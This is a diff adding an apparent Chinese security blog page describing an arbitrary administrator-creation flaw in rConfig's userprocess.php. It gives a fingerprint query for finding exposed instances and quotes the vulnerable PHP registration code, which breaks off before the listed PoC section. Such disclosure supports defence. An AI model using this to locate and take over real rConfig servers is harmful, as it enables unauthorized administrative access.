@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>rConfig userprocess.php 任意用户创建漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="rConfig userprocess.php 任意用户创建漏洞" />
+<meta property="og:description" content="rConfig userprocess.php 任意用户创建漏洞 漏洞描述 rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台 漏洞影响 1 rConfig 网络测绘 1 app=&#34;rConfig&#34; 漏洞复现 出现漏" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="rConfig userprocess.php 任意用户创建漏洞"/>
+<meta name="twitter:description" content="rConfig userprocess.php 任意用户创建漏洞 漏洞描述 rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台 漏洞影响 1 rConfig 网络测绘 1 app=&#34;rConfig&#34; 漏洞复现 出现漏"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/readme/" /><link rel="next" href="http://example.org/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "rConfig userprocess.php 任意用户创建漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1889 ,
+        "url": "http:\/\/example.org\/rconfig-userprocess.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">rConfig userprocess.php 任意用户创建漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1889 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#漏洞poc">漏洞POC</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="rconfig-userprocessphp-任意用户创建漏洞">rConfig userprocess.php 任意用户创建漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>rConfig userprocess.php 存在任意用户创建漏洞，发送特定的请求包攻击者可以创建管理员账户登录后台</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rConfig
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;rConfig&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>出现漏洞的文件为 userproce.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * Process.php
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * 
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * The Process class is meant to simplify the task of processing
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * user submitted forms, redirecting the user to the correct
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * pages if errors are found, or if form is successful, either
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * way. Also handles the logout procedure.
+</span></span></span><span class="line"><span class="cl"><span class="sd"> *
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * Written by: Jpmaster77 a.k.a. The Grandmaster of C++ (GMC)
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * Last Updated: August 19, 2004
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;/home/rconfig/classes/usersession.class.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Process</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Class constructor */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">Process</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* User submitted login form */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sublogin&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procLogin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Admin submitted user add form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;add&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procRegister</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Admin submitted user edit form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;add&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;editid&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procUpdateAccount</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* User submitted forgot password form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subforgot&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procForgotPass</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* User submitted edit account form */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subedit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procEditAccount</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">         * The only other reason user should be directed here
+</span></span></span><span class="line"><span class="cl"><span class="sd">         * is if he wants to logout, which means user is
+</span></span></span><span class="line"><span class="cl"><span class="sd">         * logged in currently.
+</span></span></span><span class="line"><span class="cl"><span class="sd">         */</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">logged_in</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">procLogout</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">         * Should not get here, which means user is viewing this page
+</span></span></span><span class="line"><span class="cl"><span class="sd">         * by mistake and therefore is redirected.
+</span></span></span><span class="line"><span class="cl"><span class="sd">         */</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /login.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procLogin - Processes the user submitted login form, if errors
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * are found, the user is redirected to correct the information,
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * if not, the user is effectively logged in to the system.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procLogin</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">,</span> <span class="nv">$form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Login attempt */</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$retval</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">login</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">],</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;remember&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Login successful */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Login failed */</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;value_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;error_array&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">getErrorArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: &#34;</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">referrer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procLogout - Simply attempts to log the user out of the system
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * given that there is no logout form to process.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procLogout</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$retval</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">logout</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /login.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * procRegister - Processes the user submitted registration form,
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * if errors are found, the user is redirected to correct the
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * information, if not, the user is effectively registered with
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * the system and an email is (optionally) sent to the newly
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * created user.
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">procRegister</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$session</span><span class="p">,</span> <span class="nv">$form</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Convert username to all lowercase (by option) */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">ALL_LOWERCASE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Registration attempt */</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$retval</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passconf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ulevelid&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Registration Successful */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;reguname&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;regsuccess&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
